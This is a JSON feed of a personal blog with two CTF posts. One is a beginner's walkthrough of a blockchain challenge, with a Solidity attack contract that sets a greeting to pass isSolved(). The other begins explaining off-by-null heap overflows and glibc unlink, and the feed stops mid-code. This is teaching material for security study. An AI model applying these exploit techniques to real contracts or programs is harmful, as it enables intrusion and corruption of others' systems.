{
    "version": "https://jsonfeed.org/version/1",
    "title": "冷风喧嚣",
    "subtitle": "懒狗一只",
    "icon": "https://www.coldwinds.top/images/favicon.ico",
    "description": null,
    "home_page_url": "https://www.coldwinds.top",
    "items": [
        {
            "id": "https://www.coldwinds.top/2022/10/Blockchain-solve/",
            "url": "https://www.coldwinds.top/2022/10/Blockchain-solve/",
            "title": "Blockchain解题入门",
            "date_published": "2022-10-09T09:14:26.000Z",
            "content_html": "<h1 id=\"blockchain解题入门\"><a class=\"anchor\" href=\"#blockchain解题入门\">#</a> Blockchain 解题入门</h1>\n<blockquote>\n<p>写在前面：近年来 Blockchain 在 CTF 比赛中的出现频率越来越高，并且相比于其他方向，Blockchain 在解题入门方面的教程还比较少，对于新手来说可能连题目都看不懂，本文以 Chainflag 平台为例，简单介绍了 Blockchain 方向题目的解题步骤。</p>\n</blockquote>\n<p>智能合约语言目前以 Solidity 为主，除此以外，还有 Vyper、Mandala 和 Obsidian 等在不同方向改善智能合约的语言。</p>\n<h2 id=\"一些工具\"><a class=\"anchor\" href=\"#一些工具\">#</a> 一些工具</h2>\n<p>这里主要写一下解题时需要用到的一些工具。</p>\n<h3 id=\"ide\"><a class=\"anchor\" href=\"#ide\">#</a> IDE</h3>\n<blockquote>\n<p>Solidity 网站上有编译器的安装教程：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnNvbGlkaXR5bGFuZy5vcmcvZW4vZGV2ZWxvcC9pbnN0YWxsaW5nLXNvbGlkaXR5Lmh0bWw=\">https://docs.soliditylang.org/en/develop/installing-solidity.html</span></p>\n<p>推荐使用 REMIX：<span class=\"exturl\" data-url=\"aHR0cDovL3JlbWl4LmV0aGVyZXVtLm9yZy8lRUYlQkMlOEMlRTUlOEYlQUYlRTQlQkIlQTUlRTUlOUMlQTglRTYlQjUlOEYlRTglQTclODglRTUlOTklQTglRTQlQjglQUQlRTUlQkYlQUIlRTklODAlOUYlRTklODMlQTglRTclQkQlQjIlRTYlQjUlOEIlRTglQUYlOTUlRTYlOTklQkElRTglODMlQkQlRTUlOTAlODglRTclQkElQTYlRUYlQkMlOEMlRTQlQjglOEQlRTklOUMlODAlRTglQTYlODElRTUlOUMlQTglRTYlOUMlQUMlRTUlOUMlQjAlRTUlQUUlODklRTglQTMlODUlRTQlQkIlQkIlRTQlQkQlOTUlRTclQTglOEIlRTUlQkElOEYlRUYlQkMlOEMlRTQlQjklOUYlRTYlOTglQUYlRTQlQkIlQTUlRTUlQTQlQUElRTUlOUQlOEElRTUlQUUlOTglRTYlOTYlQjklRTYlOEUlQTglRTglOEQlOTAlRTclOUElODQlRTYlOTklQkElRTglODMlQkQlRTUlOTAlODglRTclQkElQTYlRTUlQkMlODAlRTUlOEYlOTFJREUlRTMlODAlODI=\">http://remix.ethereum.org/，可以在浏览器中快速部署测试智能合约，不需要在本地安装任何程序，也是以太坊官方推荐的智能合约开发 IDE。</span></p>\n</blockquote>\n<h4 id=\"remix主界面\"><a class=\"anchor\" href=\"#remix主界面\">#</a> REMIX 主界面</h4>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120190858.png\" alt=\"\" title=\"初始界面\" /></p>\n<h4 id=\"左侧remix-logo下方第一个选项是workspaces可以建立多个工作区在工作区内可以新建合约\"><a class=\"anchor\" href=\"#左侧remix-logo下方第一个选项是workspaces可以建立多个工作区在工作区内可以新建合约\">#</a> 左侧 REMIX logo 下方第一个选项是 workspaces，可以建立多个工作区，在工作区内可以新建合约。</h4>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120191256.png\" alt=\"\" title=\"代码编辑界面\" /></p>\n<h4 id=\"logo下方第二个选项是编译可以选择语言及版本合约中的语法错误也会显示在这里\"><a class=\"anchor\" href=\"#logo下方第二个选项是编译可以选择语言及版本合约中的语法错误也会显示在这里\">#</a> logo 下方第二个选项是编译，可以选择语言及版本，合约中的语法错误也会显示在这里。</h4>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120191420.png\" alt=\"\" title=\"编译界面（一般会自动编译）\" /></p>\n<h4 id=\"第三个选项是部署和执行在代码编译完成后可以在这里部署合约也可以和已部署的合约进行交互\"><a class=\"anchor\" href=\"#第三个选项是部署和执行在代码编译完成后可以在这里部署合约也可以和已部署的合约进行交互\">#</a> 第三个选项是部署和执行，在代码编译完成后，可以在这里部署合约，也可以和已部署的合约进行交互。</h4>\n<blockquote>\n<p>ENVIRONMENT：默认使用 JS 虚拟机本地模拟一条测试链，如果想要连接测试网，选择 Injected Provider。</p>\n<p>ACCOUNT：当前使用的账户，如果是默认的 JS 虚拟机会分配数个有大量测试币的测试账户，如果环境是 Injected Provider，可以在 MetaMask 中切换账户。</p>\n<p>GAS LIMIT：合约的 gas 上限。</p>\n<p>VALUE：转入多少 ETH。</p>\n<p>CONTARCT：一个文件中可能包含多个合约，这里选择具体部署哪一个合约。</p>\n<p>At Address：如果合约已经部署，可以在这里输入该合约的地址进行交互。</p>\n</blockquote>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120192028.png\" alt=\"\" title=\"交互界面\" /></p>\n<h3 id=\"钱包\"><a class=\"anchor\" href=\"#钱包\">#</a> 钱包</h3>\n<p>推荐使用 MetaMask，chrome 浏览器上的一个插件。</p>\n<blockquote>\n<p>记住要保存好 MetaMask 的解锁密码。</p>\n</blockquote>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220928130453.png\" alt=\"\" /></p>\n<h4 id=\"新建账户\"><a class=\"anchor\" href=\"#新建账户\">#</a> 新建账户</h4>\n<p>MateMask 上创建账户非常简单，点击右上角的用户栏，选择新建账户，随意输入一个名称即可。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120185758.png\" alt=\"\" /></p>\n<h4 id=\"如何获取以太币\"><a class=\"anchor\" href=\"#如何获取以太币\">#</a> 如何获取以太币</h4>\n<p>在新建一个账户后，我们的账户中是没有 ETH 的，需要从水龙头中获取 ETH。</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb2VybGlmYXVjZXQuY29tLw==\">https://goerlifaucet.com/</span></p>\n<p>每天可以获得 0.25ETH</p>\n</blockquote>\n<h4 id=\"网络切换\"><a class=\"anchor\" href=\"#网络切换\">#</a> 网络切换</h4>\n<p>本次比赛题目部署在 Goerli 测试网络上，如果在其他测试网络上，可以在 MetaMask 的右上角进行网络切换。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120192757.png\" alt=\"\" title=\"在主网和各个测试网中切换\" /></p>\n<h3 id=\"反编译器\"><a class=\"anchor\" href=\"#反编译器\">#</a> 反编译器</h3>\n<p>合约其实也跟程序差不多，可以反编译，也可以进行调试，这里推荐一个在线反编译合约的网站。</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldGhlcnZtLmlvL2RlY29tcGlsZQ==\">https://ethervm.io/decompile</span></p>\n</blockquote>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/1642681593(1).png\" alt=\"\" /></p>\n<h4 id=\"可以得到合约反编译出来的代码以及合约中的函数或变量\"><a class=\"anchor\" href=\"#可以得到合约反编译出来的代码以及合约中的函数或变量\">#</a> 可以得到合约反编译出来的代码，以及合约中的函数或变量。</h4>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120202349.png\" alt=\"\" /></p>\n<h3 id=\"区块链浏览器\"><a class=\"anchor\" href=\"#区块链浏览器\">#</a> 区块链浏览器</h3>\n<p>区块链浏览器是专门用来查看链上的各种信息的工具，可以检索的信息包括但不限于：账户地址、合约地址、交易 Hash 等。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120205326.png\" alt=\"\" /></p>\n<p>查询账户地址可以看到当前余额，近期交易等信息。</p>\n<h2 id=\"解题流程\"><a class=\"anchor\" href=\"#解题流程\">#</a> 解题流程</h2>\n<p>以 chainflag 平台为例，题目会给出题目名称、题目描述、题目 Docker 等信息。</p>\n<p><img data-src=\"C:%5CUsers%5CViper%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220120205753648.png\" alt=\"image-20220120205753648\" /></p>\n<p>在连接上 docker 后，给出了四个选项以及题目要求：</p>\n<p>![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NvbGR3aW5kczUxNjcvUGljdHVyZS9tYWluL2ltZy9TY3JlZW5zaG90\">https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/Screenshot</span> from 2022-01-20 05-04-55.png &quot;连接 docker&quot;)</p>\n<blockquote>\n<p>题目要求：让 isSolved () 函数返回 true</p>\n<p>四个选项：</p>\n<ol>\n<li>创建一个用于该题目的账户。</li>\n<li>用步骤 1 的账户部署题目。</li>\n<li>达成目标后获取 flag。</li>\n<li>显示合约源代码。</li>\n</ol>\n</blockquote>\n<h3 id=\"1创建题目账户\"><a class=\"anchor\" href=\"#1创建题目账户\">#</a> 1. 创建题目账户</h3>\n<p>这里我们先选择 1，创建一个账户：</p>\n<p>![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NvbGR3aW5kczUxNjcvUGljdHVyZS9tYWluL2ltZy9TY3JlZW5zaG90\">https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/Screenshot</span> from 2022-01-20 05-06-09.png &quot;创建题目账户&quot;)</p>\n<p>创建完成后，返回给了我们：</p>\n<blockquote>\n<p>账户地址，用于部署题目合约。</p>\n<p>token，用于选项 2 部署合约以及选项 3 获取 flag。</p>\n</blockquote>\n<p>同时提示我们需要向该账户转一定量的 ETH，转入的 ETH 会用于部署合约，需要注意的是，这里的数值是当前部署合约的预估价，根据实时 Gas 价格不同可能会有浮动（不够就多转点）。</p>\n<h3 id=\"2部署题目合约\"><a class=\"anchor\" href=\"#2部署题目合约\">#</a> 2. 部署题目合约</h3>\n<p>由于 docker 执行完 1 后不会自动断开连接，所以手动断开 docker 并重新 nc。</p>\n<p>接着我们选择 2，部署题目合约：</p>\n<p>![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NvbGR3aW5kczUxNjcvUGljdHVyZS9tYWluL2ltZy9TY3JlZW5zaG90\">https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/Screenshot</span> from 2022-01-20 05-06-41.png &quot;部署题目合约&quot;)</p>\n<p>这时会要求我们输入 token，也就是选项 1 所给的 token。</p>\n<p>在部署完成后，返回给了我们：</p>\n<blockquote>\n<p>合约地址，即部署的题目合约。</p>\n<p>部署合约的交易 hash。</p>\n</blockquote>\n<p>当执行完选项 2 后，题目就算部署完毕了，接下来就需要在 REMIX 上编写攻击合约对题目进行攻击，以实现题目要求，获取 flag。</p>\n<h3 id=\"3编写攻击合约\"><a class=\"anchor\" href=\"#3编写攻击合约\">#</a> 3. 编写攻击合约</h3>\n<p>在我们编写攻击合约时，需要调用题目合约中的函数，比如 <code>isSolved()</code> 。</p>\n<p>和传统语言一样，我们在调用某个函数时，需要先有该函数的定义。因此，我们需要得到题目合约的源码，一般情况下题目都会给出源码，也就是上面的选项 4：</p>\n<p>![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NvbGR3aW5kczUxNjcvUGljdHVyZS9tYWluL2ltZy9TY3JlZW5zaG90\">https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/Screenshot</span> from 2022-01-20 05-07-40.png &quot;获取题目合约源码&quot;)</p>\n<p>而对于那些没有给出源码的题目，我们就需要通过反编译工具来逆出题目合约的逻辑，来复写代码。</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Greeter</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token builtin\">string</span> greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _greeting<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        greeting <span class=\"token operator\">=</span> _greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">greet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">//setGreeting 可以接受一个 string 类型的参数，并把这个参数的值赋给 greeting</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">setGreeting</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _greeting<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        greeting <span class=\"token operator\">=</span> _greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">isSolved</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> expected <span class=\"token operator\">=</span> <span class=\"token string\">\"HelloChainFlag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>expected<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>greeting<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>得到题目合约的源代码后，分析一下函数，有 <code>greet()</code>  、 <code>setGreeting()</code> 、 <code>isSolved()</code>  三个函数。</p>\n<p>题目要求让 <code>isSolved()</code>  返回 true，就需要让 <code>keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting))</code> ，也就是 <code>expected==greeting</code> ，而题目合约中使 <code>expected = &quot;HelloChainFlag&quot;</code> ，那么我们只要修改 <code>greeting</code>  为 <code>&quot;HelloChainFlag&quot;</code> ，就可以实现题目要求。</p>\n<p>而题目合约中刚好存在可以修改 <code>greeting</code>  的函数 —— <code>setGreeting()</code> 。那么我们只需要调用 <code>setGreeting()</code>  并修改 <code>greeting</code> ，然后再调用 <code>isSolved()</code> ，就算完成题目要求。</p>\n<p>那么下面开始编写攻击合约：</p>\n<figure class=\"highlight solidity\"><figcaption data-lang=\"Solidity (Ethereum)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.8</span><span class=\"token number\">.7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 因为我们的攻击合约需要用到题目合约的函数，所以这里直接照搬题目合约的代码，用来提供定义。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Greeter</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token builtin\">string</span> greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _greeting<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        greeting <span class=\"token operator\">=</span> _greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">greet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">setGreeting</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _greeting<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        greeting <span class=\"token operator\">=</span> _greeting<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">isSolved</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> expected <span class=\"token operator\">=</span> <span class=\"token string\">\"HelloChainFlag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>expected<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>greeting<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">contract</span> <span class=\"token class-name\">exp</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">// 首先要确定需要攻击的合约，因此这里填上之前选项 2 部署的合约的地址</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token builtin\">address</span> instance_address <span class=\"token operator\">=</span> <span class=\"token number\">0x6bed92ec6DD3363ED64E27A669C24880a79A56c3</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\">// 这里把题目合约地址和模块简化一下，后面调用时直接用 target 就可以了</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    Greeter target <span class=\"token operator\">=</span> <span class=\"token function\">Greeter</span><span class=\"token punctuation\">(</span>instance_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token comment\">// 在攻击合约里定义一个 hack 函数，public 说明该函数可供外部、子合约、合约内部访问。后面的 returns 则是定义该函数的返回值类型</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">hack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token builtin\">bool</span> answer <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token comment\">// 定义一个 string 类型的变量 greeting 并赋值为 \"HelloChainFlag\"，memory 表示数据储存在内存中，并不会储存在链上，可以节省 gas。</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> greeting <span class=\"token operator\">=</span> <span class=\"token string\">\"HelloChainFlag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token comment\">// 调用题目合约的 setGreeting 函数，并将 greeting 作为参数传输过去</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        target<span class=\"token punctuation\">.</span><span class=\"token function\">setGreeting</span><span class=\"token punctuation\">(</span>greeting<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token comment\">// 调用题目合约的 isSolved 函数，在执行完上一条语句后，题目合约中的 expected 就会等于 greeting，因此 isSolved 会返回 true，达成题目要求。</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        answer <span class=\"token operator\">=</span> target<span class=\"token punctuation\">.</span><span class=\"token function\">isSolved</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">return</span> answer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"4部署攻击合约并进行攻击\"><a class=\"anchor\" href=\"#4部署攻击合约并进行攻击\">#</a> 4. 部署攻击合约并进行攻击</h3>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120220301.png\" alt=\"\" title=\"编译攻击合约\" /></p>\n<p>编写好攻击合约后，我们要先编译攻击合约，在编译时要选择好对应的 Solidity 版本。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120221350.png\" alt=\"\" title=\"部署攻击合约\" /></p>\n<blockquote>\n<p>前面提到一个 sol 文件中可能会存在多个合约，因此这里选择攻击合约（exp）。</p>\n</blockquote>\n<p>在部署完成后，左边的 <code>Deployed Contracts</code>  下会出现我们的攻击合约，我们将他展开：</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120222212.png\" alt=\"\" /></p>\n<p>名为 hack 的黄色按钮就是我们攻击合约中的 hack 函数，点击按钮就会执行一次 hack 函数，当然，因为它和已经上链的题目合约产生了交互，所以需要花费 gas。</p>\n<p>我们点击 hack，MateMask 会弹出一个支付窗口用于核对交易金额及手续费。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/20220120222432.png\" alt=\"\" title=\"核对金额及手续费\" /></p>\n<p>确认支付后，可以在下方看到执行状态，出现绿勾说明函数执行成功，点击绿勾可以查看详细信息，同时我们也可以在区块链浏览器中查到我们这一笔交易的信息。</p>\n<h3 id=\"5获取flag\"><a class=\"anchor\" href=\"#5获取flag\">#</a> 5. 获取 flag</h3>\n<p>因为我们成功使 isSolved 函数返回 true，完成了题目的要求，所以我们重新连接 docker，选择选项 3，还是输入之前的 token，在验证完成后就会给我们回显 flag。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/Coldwinds5167/Picture/main/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220120223148.png\" alt=\"\" title=\"获得flag\" /></p>\n",
            "tags": [
                "Blockchain"
            ]
        },
        {
            "id": "https://www.coldwinds.top/2022/04/pwn-offbynull/",
            "url": "https://www.coldwinds.top/2022/04/pwn-offbynull/",
            "title": "off-by-null",
            "date_published": "2022-04-18T13:34:29.000Z",
            "content_html": "<h1 id=\"off-by-null\"><a class=\"anchor\" href=\"#off-by-null\">#</a> Off by null</h1>\n<h2 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h2>\n<p>​\t\t在读入数据的时候，对数据长度的检查不严谨，导致了一个 NULL 字节的溢出。在堆块 size 为 0x100 时，溢出 NULL 字节会导致 prev_inuse 位被清零，该堆块的前一个堆块会被认为是 free（未分配）状态。因此可以通过 unlink 实现任意地址写，或者伪造 prev_size 达到 UAF 的效果。</p>\n<h2 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h2>\n<ol>\n<li>开辟三个堆块分别为 chunk0、chunk1、chunk2。</li>\n<li>编辑 chunk1，输入特定数据使其溢出一个 NULL（\\x00）字节，覆盖 chunk2 的 prev_inuse 位为 0，这时 chunk1 就会被认为 free 掉了。</li>\n</ol>\n<h1 id=\"unlink\"><a class=\"anchor\" href=\"#unlink\">#</a> Unlink</h1>\n<p>​\t\tUnlink 是把 free 掉的 chunk 从所属的 bins 链中，卸下来的操作（当然还包括一系列的检测机制）。它是在 free 掉一块 chunk (除 fastbin 的 chunk 外）之后，glibc 检查这块 chunk 相邻的上下两块 chunk 的 free 状态之后，做出的堆块合并引起的。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BK<span class=\"token operator\">-</span>P<span class=\"token operator\">-</span>FD<span class=\"token operator\">==</span><span class=\"token operator\">></span>BK<span class=\"token operator\">-</span>FD    P</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 三个堆块</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>FD<span class=\"token operator\">=</span>P<span class=\"token operator\">-></span>fd</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>BK<span class=\"token operator\">=</span>P<span class=\"token operator\">-></span>bk</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// 确定堆块顺序</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>FD<span class=\"token 